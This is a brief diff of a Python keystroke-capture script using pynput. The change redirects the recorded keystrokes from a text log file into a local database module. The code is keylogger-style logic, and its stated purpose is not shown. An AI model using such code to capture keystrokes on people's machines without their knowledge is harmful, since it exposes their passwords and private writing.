@@ -1,6 +1,7 @@
 from pynput.keyboard import Listener, Key
 from collections import deque
 import timeit
+import database
 
 conteudo = ""
 time_i = 0
@@ -24,8 +25,8 @@ def time_monitor():
     print(time_i)
 
 def send_data():
-    with open("log3.txt", "a") as file_log:
-        file_log.write(conteudo)
+    db = database.Database()
+    db.insert(conteudo)
 
 def monitor(key):
     try:
